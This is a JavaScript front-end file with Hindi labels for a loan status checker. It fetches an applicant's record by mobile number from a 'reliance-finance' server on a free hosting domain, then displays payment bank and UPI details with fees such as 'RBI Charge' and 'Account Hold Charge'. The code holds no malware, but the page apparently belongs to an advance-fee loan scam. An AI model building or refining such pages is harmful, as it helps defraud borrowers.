"use strict";

const API_BASE = "https://reliance-finance.onrender.com";

const FIELD_LABELS = {
  name: "नाम",
  fullName: "पूरा नाम",
  mobile: "मोबाइल नंबर",
  email: "ईमेल",
  address: "पता",
  applicationId: "Application ID",
  status: "आवेदन का स्टेटस",
  loanType: "लोन का प्रकार",
  loanAmount: "लोन राशि",
  occupation: "व्यवसाय",
  income: "मासिक आय",
  employment: "रोजगार प्रकार",
  city: "शहर",
  state: "राज्य",
  accountHolderName: "खाताधारक का नाम",
  bankName: "बैंक का नाम",
  accountNumber: "अकाउंट नंबर",
  ifscCode: "IFSC कोड",
  upiId: "UPI ID",
  processingFee: "Processing Fee",
  tds: "TDS",
  rbiCharge: "RBI Charge",
  gst: "GST",
  nocCharge: "NOC Charge",
  verificationCharge: "Verification Charge",
  documentationCharge: "Documentation Charge",
  insuranceCharge: "Insurance Charge",
  accountHoldCharge: "Account Hold Charge",
  otherCharge: "Other Charge",
  whatsappNumber: "WhatsApp नंबर",
  helplineNumber: "हेल्पलाइन नंबर",
  contactEmail: "संपर्क ईमेल"
};

const PRIVATE_FIELDS = new Set([
  "password",
  "adminpassword",
  "secret",
  "secretkey",
  "token",
  "authorization"
]);

function getElement(...ids) {
  for (const id of ids) {
    const element = document.getElementById(id);
    if (element) return element;
  }
  return null;
}

function getSafeLabel(key) {
  return FIELD_LABELS[key] ||
    key.replace(/([a-z])([A-Z])/g, "$1 $2")
       .replace(/^./, character => character.toUpperCase());
}

function addRow(table, label, value) {
  const row = document.createElement("tr");
  const heading = document.createElement("th");
  const cell = document.createElement("td");

  heading.textContent = label;
  cell.textContent = String(value);

  [heading, cell].forEach(element => {
    element.style.padding = "10px";
    element.style.border = "1px solid #ddd";
    element.style.textAlign = "left";
    element.style.overflowWrap = "anywhere";
  });

  row.append(heading, cell);
  table.appendChild(row);
}

function renderApplication(resultBox, application) {
  const heading = document.createElement("h3");
  heading.textContent = "आवेदन की जानकारी";

  const table = document.createElement("table");
  table.style.width = "100%";
  table.style.borderCollapse = "collapse";

  let count = 0;

  for (const [key, value] of Object.entries(application)) {
    if (PRIVATE_FIELDS.has(key.toLowerCase())) continue;
    if (value === null || value === undefined || value === "") continue;
    if (typeof value === "object") continue;

    // अगर यह बैंक या चार्ज से जुड़े फील्ड्स हैं, तो इन्हें हम नीचे वाले डिब्बे में दिखाएंगे
    const lowerKey = key.toLowerCase();
    if (
      lowerKey.includes("account") ||
      lowerKey.includes("bank") ||
      lowerKey.includes("ifsc") ||
      lowerKey.includes("upi") ||
      lowerKey.includes("charge") ||
      lowerKey.includes("fee") ||
      lowerKey.includes("tds") ||
      lowerKey.includes("gst")
    ) {
      continue;
    }

    addRow(table, getSafeLabel(key), value);
    count++;
  }

  if (count === 0) {
    resultBox.textContent = "दिखाने के लिए कोई जानकारी उपलब्ध नहीं है।";
    return;
  }

  resultBox.replaceChildren(heading, table);
}

function renderAccountDetails(accountBox, application, globalDetails) {
  if (!accountBox) return;

  // एप्लीकेशन या ग्लोबल डेटा से बैंक/चार्ज डिटेल्स निकालें
  const combined = { ...globalDetails, ...application };

  const heading = document.createElement("h3");
  heading.textContent = "बैंक अकाउंट और पेमेंट डिटेल्स";

  const table = document.createElement("table");
  table.style.width = "100%";
  table.style.borderCollapse = "collapse";

  let count = 0;

  for (const [key, value] of Object.entries(combined)) {
    if (value === null || value === undefined || value === "") continue;

    const lowerKey = key.toLowerCase();
    const isRelevant =
      lowerKey.includes("account") ||
      lowerKey.includes("bank") ||
      lowerKey.includes("ifsc") ||
      lowerKey.includes("upi") ||
      lowerKey.includes("charge") ||
      lowerKey.includes("fee") ||
      lowerKey.includes("tds") ||
      lowerKey.includes("gst");

    if (isRelevant) {
      addRow(table, getSafeLabel(key), value);
      count++;
    }
  }

  if (count > 0) {
    accountBox.style.display = "block";
    accountBox.replaceChildren(heading, table);
  } else {
    accountBox.style.display = "none";
  }
}

async function checkApplicationStatus(mobile) {
  const resultBox = getElement("statusResult", "status-result");
  const accountBox = getElement("accountDetailsResult", "account-details-result");

  if (!resultBox) {
    console.error("Status result HTML element नहीं मिला।");
    return;
  }

  const phone = String(mobile || "").trim();

  if (!phone) {
    resultBox.textContent = "मोबाइल नंबर दर्ज करें।";
    if (accountBox) accountBox.style.display = "none";
    return;
  }

  resultBox.textContent = "जानकारी लोड हो रही है...";
  if (accountBox) accountBox.style.display = "none";

  try {
    const [appResponse, accResponse] = await Promise.all([
      fetch(${API_BASE}/check-application?mobile=${encodeURIComponent(phone)}),
      fetch(${API_BASE}/account-details).catch(() => null)
    ]);

    const data = await appResponse.json();

    if (!appResponse.ok || data.error || data.success === false) {
      resultBox.textContent =
        data.message || data.error || "आवेदन की जानकारी नहीं मिली।";
      return;
    }

    const application = data.application || data.data || data;

    let globalAccountDetails = {};
    if (accResponse && accResponse.ok) {
      const accData = await accResponse.json();
      globalAccountDetails = accData.accountDetails || accData.data || accData;
    }

    if (
      !application ||
      typeof application !== "object" ||
      Array.isArray(application)
    ) {
      resultBox.textContent = "सर्वर से सही जानकारी नहीं मिली।";
      return;
    }

    // 1. मुख्य लोन फॉर्म डिटेल्स दिखाएं
    renderApplication(resultBox, application);

    // 2. बैंक अकाउंट, यूपीआई और चार्जेस को दूसरे डिब्बे में दिखाएं
    renderAccountDetails(accountBox, application, globalAccountDetails);

  } catch (error) {
    console.error("Check Status error:", error);
    resultBox.textContent =
      "सर्वर से संपर्क नहीं हो सका। कृपया बाद में कोशिश करें।";
  }
}

async function loadPublicContactDetails() {
  try {
    const response = await fetch(${API_BASE}/account-details);
    if (!response.ok) return;

    const data = await response.json();
    const details = data.accountDetails || data.data || data;

    const whatsapp = getElement("websiteWhatsapp", "whatsappNumber");
    const helpline = getElement("websiteHelpline", "helplineNumber");
    const email = getElement("websiteEmail", "contactEmail");

    if (whatsapp && details.whatsappNumber) {
      whatsapp.textContent = details.whatsappNumber;
    }

    if (helpline && details.helplineNumber) {
      helpline.textContent = details.helplineNumber;
    }

    if (email && details.contactEmail) {
      email.textContent = details.contactEmail;
    }
  } catch (error) {
    console.error("Contact details load error:", error);
  }
}

window.checkApplicationStatus = checkApplicationStatus;

document.addEventListener("DOMContentLoaded", () => {
  loadPublicContactDetails();

  const statusButton = getElement(
    "checkStatusBtn",
    "check-status-btn",
    "checkStatusButton"
  );

  const mobileInput = getElement(
    "statusMobile",
    "status-mobile",
    "checkMobile",
    "mobileNumber"
  );

  if (statusButton && mobileInput) {
    statusButton.addEventListener("click", event => {
      event.preventDefault();
      checkApplicationStatus(mobileInput.value);
    });
  }

  const statusForm = getElement("statusForm", "status-form");

  if (statusForm && mobileInput) {
    statusForm.addEventListener("submit", event => {
      event.preventDefault();
      checkApplicationStatus(mobileInput.value);
    });
  }
});
